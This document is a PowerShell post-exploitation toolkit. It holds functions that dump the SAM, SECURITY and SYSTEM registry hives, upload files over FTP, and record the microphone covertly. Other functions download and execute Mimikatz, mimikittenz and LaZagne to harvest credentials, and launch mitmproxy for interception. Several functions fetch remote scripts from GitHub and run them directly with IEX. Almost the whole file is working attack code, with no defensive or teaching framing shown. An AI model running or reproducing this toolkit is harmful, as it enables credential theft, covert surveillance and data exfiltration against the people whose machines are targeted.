#Download -url "https://example.com/file.txt" -outputfile "c:\windows\temp\file.txt"
function Download ($url, $outputfile)
{
   (New-Object System.Net.WebClient).DownloadFile($url, $outputfile);
}

#DownloadScript -url "http://example.com/a.ps1" 
function DownloadScript($url)
{
    (New-Object System.Net.WebClient).DownloadString($url);
}

#Unzip -inputfile "myzip.zip" -outputfolder "c:\windows\temp"
function Unzip($inputfile, $outputfolder)
{
    $shell = new-object -com shell.application;
    foreach($item in $shell.NameSpace($inputfile).items());
    {
        $shell.Namespace($outputfolder).copyhere($item);
    }
}

#UploadFtp -address "192.168.0.1" -username "username" -password "password" -outputfile "/folder/file.txt" -inputfile "file.txt"
function UploadFtp($address, $username, $password, $outputfile, $inputfile)
{
    $uriString = "ftp://" + $username + ":" + $password + "@" + $address + $outputfile;
    (New-Object System.Net.WebClient).UploadFile((New-Object System.Uri($uriString) ), $inputfile);
}

#DumpHives -outputfolder "C:\windows\temp"
function DumpHives($outputfolder)
{   
    Reg save HKLM\SAM (Join-Path $outputfolder "sam.hiv");
    Reg save HKLM\SECURITY (Join-Path $outputfolder "security.hiv");
    Reg save HKLM\SYSTEM (Join-Path $outputfolder "system.hiv");
}

#RunVoiceRecord -outputfile "C:\windows\temp\secret.wav" -seconds 120
function RunVoiceRecord($outputfile, $seconds)
{
    IEX (DownloadScript -url "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1");
    Get-MicrophoneAudio -Path $outputfile -Length $seconds -Alias "top_secret";
}

#RunMitmp
function RunMitmp()
{
    $path = $env:TEMP;
    $filename = "mitmp.zip";
    $fullpath = Join-Path $path $filename;
    Download -url "https://github.com/mitmproxy/mitmproxy/releases/download/v2.0.2/mitmproxy-2.0.2-windows.zip" -outputfile $fullpath;
    Unzip -inputfile $fullpath -outputfolder $path;
    $mitmp = Join-Path $path "mitmdump.exe";
    & $mitmp;
}

#RunLazagne
function RunLazagne()
{
    $path = $env:TEMP;
    $filename = "laza.zip";
    $fullpath = Join-Path $path $filename;
    Download -url "https://github.com/AlessandroZ/LaZagne/releases/download/2.3.1/Windows.zip" -outputfile $fullpath;
    Unzip -inputfile $fullpath -outputfolder $path;
    $lazagne = Join-Path $path "/Windows/laZagne.exe";
    & $lazagne "all";
}

#RunMimikatz
function RunMimikatz()
{
    IEX (DownloadScript -url "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1");
    Invoke-Mimikatz -DumpCreds;
}

#RunMimikittenz
function RunMimikittenz()
{
    IEX (DownloadScript -url "https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1");
    Invoke-mimikittenz;
}